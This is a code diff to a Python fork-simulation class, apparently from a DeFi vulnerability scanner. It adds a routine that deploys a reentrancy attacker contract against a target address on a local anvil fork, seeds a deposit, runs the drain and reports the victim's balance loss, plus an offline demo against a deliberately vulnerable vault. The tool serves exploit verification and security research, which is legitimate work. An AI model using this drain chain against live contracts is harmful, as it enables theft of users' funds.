@@ -476,15 +476,14 @@ class ForkSimulator:
             self.why_not = ("Fork verification skipped: foundry binaries "
                             "(anvil/cast) not found on PATH.")
             return self
-        if not self.rpc_url or "http" not in self.rpc_url:
-            self.why_not = ("Fork verification skipped: no mainnet RPC URL "
-                            "available to fork.")
-            return self
         import subprocess as sp
-        cmd = ["anvil", "--port", str(self.port), "--fork-url", self.rpc_url,
-               "--silent"]
-        if self.block:
-            cmd += ["--fork-block-number", str(self.block)]
+        cmd = ["anvil", "--port", str(self.port), "--silent"]
+        if self.rpc_url and "http" in self.rpc_url:
+            cmd += ["--fork-url", self.rpc_url]
+            if self.block:
+                cmd += ["--fork-block-number", str(self.block)]
+        # rpc_url=None → blank anvil chain (offline self-test / drain demo
+        # does not need a mainnet fork).
         try:
             self.proc = sp.Popen(cmd, stdout=sp.DEVNULL, stderr=sp.DEVNULL)
         except OSError as e:
@@ -537,20 +536,21 @@ class ForkSimulator:
         """Give the attacker 1 ETH on the fork so real sends can pay gas."""
         proc = subprocess.run(
             ["cast", "rpc", "anvil_setBalance", self.attacker,
-             "0xDE0B6B3A7640000", "--rpc-url", self.rpc_url_local],
+             "0x1BC16D674EC80000", "--rpc-url", self.rpc_url_local],  # 2 ETH
             capture_output=True, text=True, timeout=30)
         # anvil_setBalance returns JSON 'null' on success — exit code is the truth.
         return proc.returncode == 0
 
-    def _has_code(self) -> bool:
-        """True when the target actually has bytecode on this fork.
+    def _has_code(self, addr: Optional[str] = None) -> bool:
+        """True when a target has bytecode on this fork.
 
         Calling initialize()/mint() on an EOA or a devnet-only address that
         does not exist on mainnet MINES VACUOUSLY (plain value transfer) —
         without this check a phantom address would be reported EXPLOITABLE.
         """
+        addr = addr or getattr(self, "_target", "") or ""
         proc = subprocess.run(
-            ["cast", "code", self._target, "--rpc-url", self.rpc_url_local],
+            ["cast", "code", addr, "--rpc-url", self.rpc_url_local],
             capture_output=True, text=True, timeout=30)
         out = proc.stdout.strip().lower()
         return bool(out and out not in ("0x", "0x0"))
@@ -563,14 +563,208 @@ class ForkSimulator:
         return proc.stdout.strip() or proc.stderr.strip()
 
     def _send(self, selector: str, args: List[str]) -> Dict:
-        """A REAL state-changing tx from the attacker account (fork-local)."""
+        """A REAL state-changing tx from the attacker account (fork-local).
+
+        ok=True only when the tx MINED WITH STATUS 1 — cast send 1.7.x
+        returns rc=0 even when a tx reverts on-chain, so we cross-check the
+        receipt. A reverted-but-mined tx must NOT count as proven.
+        """
         if not self._fund_attacker():
             return {"ok": False, "stdout": "", "stderr": "could not fund attacker"}
         cmd = ["cast", "send", "--unlocked", self._target, selector, *args,
                "--from", self.attacker, "--rpc-url", self.rpc_url_local]
         proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+        txhash = ""
+        if proc.returncode == 0:
+            for line in proc.stdout.splitlines():
+                if line.lower().startswith("transactionhash"):
+                    txhash = line.split()[1].strip()
+                    break
+        mined = proc.returncode == 0 and (not txhash or self._mined(txhash))
+        return {"ok": mined, "stdout": proc.stdout.strip(),
+                "stderr": proc.stderr.strip(), "txhash": txhash}
+
+    def _send_to(self, addr: str, selector: str, args: List[str],
+                 value: Optional[str] = None,
+                 gas_limit: Optional[str] = None) -> Dict:
+        """State-changing tx to an ARBITRARY contract (not just the target)."""
+        if not self._fund_attacker():
+            return {"ok": False, "stdout": "", "stderr": "could not fund attacker"}
+        cmd = ["cast", "send", "--unlocked", addr, selector, *args,
+               "--from", self.attacker, "--rpc-url", self.rpc_url_local]
+        if value:
+            cmd += ["--value", value]
+        if gas_limit:
+            cmd += ["--gas-limit", gas_limit]
+        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
+        txhash = ""
+        if proc.returncode == 0:
+            for line in proc.stdout.splitlines():
+                if line.lower().startswith("transactionhash"):
+                    txhash = line.split()[1].strip()
+                    break
+        return {"ok": proc.returncode == 0, "stdout": proc.stdout.strip(),
+                "stderr": proc.stderr.strip(), "txhash": txhash}
+
+    def _mined(self, txhash: str) -> bool:
+        """True when a tx MINED with status 1 (cast send rc alone does not
+        distinguish reverted-but-mined transactions)."""
+        if not txhash:
+            return False
+        proc = subprocess.run(
+            ["cast", "receipt", txhash, "status", "--rpc-url", self.rpc_url_local],
+            capture_output=True, text=True, timeout=30)
+        return "true" in proc.stdout.strip().lower()
+
+    def _call_on(self, addr: str, selector: str, args: List[str]) -> Dict:
+        """eth_call against an arbitrary contract (no state change)."""
+        cmd = ["cast", "call", addr, selector, *args,
+               "--rpc-url", self.rpc_url_local]
+        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
         return {"ok": proc.returncode == 0, "stdout": proc.stdout.strip(),
                 "stderr": proc.stderr.strip()}
+
+    def _deploy(self, bytecode: str, constructor_types: Optional[List[str]] = None,
+                constructor_args: Optional[List[str]] = None) -> Dict:
+        """Deploy bytecode on the fork from the attacker EOA.
+
+        Returns {'ok', 'address', 'stderr'}. Constructor args (if any) are
+        passed as a "constructor(...)" signature + args — cast appends the
+        ABI encoding itself (manually appending to the initcode makes the
+        CREATE revert with empty data).
+        """
+        if not self._fund_attacker():
+            return {"ok": False, "address": "", "stderr": "could not fund attacker"}
+        cmd = ["cast", "send", "--unlocked", "--from", self.attacker,
+               "--rpc-url", self.rpc_url_local, "--json",
+               "--create", "0x" + bytecode]
+        if constructor_types and constructor_args:
+            cmd += [f"constructor({','.join(constructor_types)})",
+                    *constructor_args]
+        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
+        if proc.returncode != 0:
+            return {"ok": False, "address": "", "stderr": proc.stderr.strip()[:300]}
+        try:
+            import json
+            data = json.loads(proc.stdout)
+            addr = (data.get("contractAddress")
+                    or (data.get("receipt") or {}).get("contractAddress")
+                    or "")
+            return {"ok": bool(addr), "address": addr,
+                    "stderr": "" if addr else proc.stdout[:200]}
+        except Exception:
+            return {"ok": False, "address": "", "stderr": proc.stdout[:200]}
+
+    def _abi_encode(self, types: List[str], args: List[str]) -> str:
+        proc = subprocess.run(
+            ["cast", "abi-encode", f"encode({','.join(types)})", *args],
+            capture_output=True, text=True, timeout=30)
+        return proc.stdout.strip() if proc.returncode == 0 else ""
+
+    def _sig_selector(self, sig: str) -> str:
+        proc = subprocess.run(["cast", "sig", sig],
+                              capture_output=True, text=True, timeout=30)
+        return proc.stdout.strip() if proc.returncode == 0 else ""
+
+    def prove_reentrancy(self, target: str, payout_sig: str = "withdraw(uint256)",
+                         amount: str = "1", demo: bool = False) -> Dict:
+        """One-block exploit chain: deploy a ReentrancyAttacker whose fallback
+        re-enters the victim's payout, seed a deposit, fire the chain, and
+        read the state diff (reentries + victim ETH before → after).
+
+        CONFIRMED — the drain chain actually executed: reentries > 1 and the
+                    victim's ETH balance decreased.
+        UNVERIFIED — compiler missing / deploy failed / chain reverted: the
+                    window may still exist but we could NOT demonstrate a drain.
+        """
+        if not self.available:
+            return {"success": False, "verdict": "UNVERIFIED",
+                    "error": self.why_not, "attack": "reentrancy",
+                    "target": target}
+        from defihunter.core import attacker
+        art = attacker.get_contract("ReentrancyAttacker")
+        if not art.get("bytecode"):
+            return {"success": False, "verdict": "UNVERIFIED",
+                    "error": "attacker contract compile unavailable (solc not found)",
+                    "attack": "reentrancy", "target": target}
+        if not self._has_code(target):
+            return {"success": False, "verdict": "REFUTED",
+                    "evidence": "target has no bytecode on this fork",
+                    "attack": "reentrancy", "target": target}
+
+        # payload = selector + encoded args of the payout call
+        sel = self._sig_selector(payout_sig)
+        sig_parts = payout_sig.split("(")[1].rstrip(")") if "(" in payout_sig else ""
+        arg_types = [t.strip() for t in sig_parts.split(",") if t.strip()]
+        arg_enc = self._abi_encode(arg_types, [amount]) if arg_types else ""
+        payload = ""
+        if sel and (not arg_types or arg_enc):
+            payload = sel + (arg_enc[2:] if arg_enc.startswith("0x") else arg_enc)
+        if not payload:
+            return {"success": False, "verdict": "UNVERIFIED",
+                    "error": f"could not encode payload for {payout_sig}",
+                    "attack": "reentrancy", "target": target}
+
+        dep = self._deploy(art["bytecode"],
+                           ["address", "address", "bytes"],
+                           [target, self.attacker, payload])
+        if not dep.get("ok"):
+            return {"success": False, "verdict": "UNVERIFIED",
+                    "error": f"attacker deploy failed: {dep.get('stderr', '')[:120]}",
+                    "attack": "reentrancy", "target": target}
+        attacker_addr = dep["address"]
+
+        # attacker deposits 1 ETH into the victim (victim records
+        # balances[attacker_contract] = 1 ETH)
+        seed = self._send_to(attacker_addr, "depositIntoVictim()", [],
+                             value="1ether")
+        if not seed["ok"]:
+            return {"success": False, "verdict": "UNVERIFIED",
+                    "error": f"could not seed deposit: {seed['stderr'][:120]}",
+                    "attack": "reentrancy", "target": target}
+        # baseline AFTER seeding — the drain must move ETH out of the victim
+        seeded = self._balance(target)
+
+        # fire the drain chain with a generous gas limit (each re-entry costs
+        # ~10k gas; default estimate may be too low to show the loop)
+        chain = self._send_to(attacker_addr, "go()", [], gas_limit="30000000")
+        chain_mined = chain["ok"] and self._mined(chain.get("txhash", ""))
+        reentries = self._call_on(attacker_addr, "reentries()", [])
+        after = self._balance(target)
+
+        steps = [
+            {"step": "deployed ReentrancyAttacker", "value": attacker_addr},
+            {"step": "attacker deposited 1 ETH into victim", "value": "seeded"},
+            {"step": "go() drain chain",
+             "value": "mined, status 1 ✅" if chain_mined
+             else (f"reverted: {chain.get('stderr','')[:100]}"
+                   if chain["ok"] else f"failed: {chain['stderr'][:100]}")},
+            {"step": "reentries()", "value": reentries["stdout"] or "read failed"},
+            {"step": "victim ETH after seed → after drain",
+             "value": f"{seeded} → {after}"},
+        ]
+        drained = False
+        try:
+            n = int(reentries["stdout"] or "0", 16)
+            drained = chain_mined and n > 1 and int(after, 16) < int(seeded, 16)
+        except Exception:
+            drained = False
+
+        if drained:
+            n = int(reentries["stdout"] or "0", 16)
+            return {"success": True, "verdict": "CONFIRMED", "attack": "reentrancy",
+                    "target": target,
+                    "profit": (f"{n} re-entrant withdrawals from "
+                               "a single deposit in one block"),
+                    "steps": steps,
+                    "evidence": (f"ReentrancyAttacker re-entered {n}×; "
+                                 f"victim ETH {seeded} → {after}"),
+                    "attacker_address": attacker_addr}
+        return {"success": False, "verdict": "UNVERIFIED",
+                "error": (f"drain chain did not demonstrate reentrancy: "
+                          f"{'go() reverted' if not chain['ok'] else 'no re-entry / no balance drop'}"),
+                "attack": "reentrancy", "target": target,
+                "steps": steps, "attacker_address": attacker_addr}
 
     def run(self, attack: str, target: str, source_finding: Optional[Dict] = None,
             abi: Optional[List[Dict]] = None) -> Dict:
@@ -599,6 +793,31 @@ class ForkSimulator:
         else:
             res["verdict"] = "UNVERIFIED"
         return res
+
+    def offline_demo(self) -> Dict:
+        """End-to-end offline self-test: deploy the vulnerable SimpleVault demo
+        on a blank anvil chain, then prove a reentrancy drain against it.
+
+        This is the CI-safe version of prove_reentrancy — it never touches a
+        mainnet RPC. Verdict should be CONFIRMED when the whole machinery
+        (compiler → deploy → seed → drain chain → state diff) works.
+        """
+        if not self.available:
+            return {"success": False, "verdict": "UNVERIFIED",
+                    "error": self.why_not, "attack": "reentrancy", "demo": True}
+        from defihunter.core import attacker
+        art = attacker.get_contract("SimpleVault")
+        if not art.get("bytecode"):
+            return {"success": False, "verdict": "UNVERIFIED",
+                    "error": "SimpleVault demo compile unavailable (solc not found)",
+                    "attack": "reentrancy", "demo": True}
+        dep = self._deploy(art["bytecode"])
+        if not dep.get("ok"):
+            return {"success": False, "verdict": "UNVERIFIED",
+                    "error": f"demo deploy failed: {dep.get('stderr', '')[:150]}",
+                    "attack": "reentrancy", "demo": True}
+        return self.prove_reentrancy(dep["address"], "withdraw(uint256)", "1",
+                                     demo=True)
 
     def _run_impl(self, attack: str, target: str, source_finding: Optional[Dict] = None) -> Dict:
         """Prove the finding on a real anvil fork.
